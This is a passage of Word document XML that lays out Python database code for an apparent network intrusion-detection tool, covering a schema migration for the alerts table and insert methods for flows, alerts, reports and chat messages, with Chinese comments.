    <w:p w14:paraId="0658494F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """给老库补列。CREATE TABLE IF NOT EXISTS 不会给已存在的表加列，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B73B117">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        少了这一步，老库上 source/rule/proba 会在读取时变成 KeyError。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A23C189">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        have = {r["name"] for r in conn.execute("PRAGMA table_info(alerts)")}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57307396">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        added = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25EAFC05">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for col, ddl in (("source", "TEXT NOT NULL DEFAULT 'model'"), ("rule", "TEXT"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E97EC8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                         ("proba", "TEXT")):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C32428">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if col not in have:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62895218">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                conn.execute(f"ALTER TABLE alerts ADD COLUMN {col} {ddl}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="376D2469">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                added.append(col)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195B3345">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if "proba" in added:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D21057">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            # 老库里 features 列实际存的是模型给出的各类概率，搬进新列；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74BEDC59">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            # 现在 features 恢复本义（78 维原始特征），报告侧读 proba</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650B7481">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            conn.execute("UPDATE alerts SET proba = features")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB7FC62">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AC3D9A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ---------------------------------------------------------------- 写入</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11902872">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="002659A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def add_flow(self, probe_id, first_seen, last_seen, flow_key, predicted,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0D63C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 confidence, features) -&gt; int:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F8141D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with self.connect() as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BBC2CF4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            cur = conn.execute(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B9C6BA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "INSERT INTO flows (probe_id, first_seen, last_seen, flow_key, predicted,"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B3E0DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                " confidence, features, created_at) VALUES (?,?,?,?,?,?,?,?)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9FD092">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                (probe_id, first_seen, last_seen, flow_key, predicted, confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C65A74">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 json.dumps(features, ensure_ascii=False), time.time()),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8C4651">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E16CA2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return int(cur.lastrowid)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32CAE06A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66ECA5DD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def add_alert(self, probe_id, flow_key, category, confidence, risk,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B956DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                  features, evidence, source="model", rule=None, proba=None) -&gt; int:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358B1D11">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """source='model' 时 confidence 是分类概率；source='rule' 时是"超出阈值多少倍"，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64CDE3BA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        两者不能放在一起比。features 存 78 维原始特征，proba 存各类概率。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F4B818D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with self.connect() as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB737F6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            cur = conn.execute(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53612583">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "INSERT INTO alerts (probe_id, flow_key, category, confidence, risk,"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="177366AB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                " features, evidence, source, rule, proba, created_at)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DAF68DD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                " VALUES (?,?,?,?,?,?,?,?,?,?,?)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76400BFC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                (probe_id, flow_key, category, confidence, risk,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D1CEBA6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 json.dumps(features, ensure_ascii=False),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D9DE33">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 json.dumps(evidence, ensure_ascii=False), source, rule,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507EA4B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 json.dumps(proba, ensure_ascii=False) if proba is not None else None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61845A9B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 time.time()),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E9DC88D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A29A7F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return int(cur.lastrowid)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A2EDA7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2191E4BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def add_report(self, alert_id, content, model, elapsed_ms=0) -&gt; int:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598F4615">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with self.connect() as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3C7B9E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            cur = conn.execute(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="568590B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "INSERT INTO reports (alert_id, content, model, elapsed_ms, created_at)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F7C984">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                " VALUES (?,?,?,?,?)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB2FA29">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                (alert_id, content, model, elapsed_ms, time.time()),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F03ED1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EBBB252">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return int(cur.lastrowid)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E16FFC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1987967A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def add_chat(self, report_id, role, content) -&gt; int:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66A9489F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with self.connect() as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E0B74FE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            cur = conn.execute(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C5F8E3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
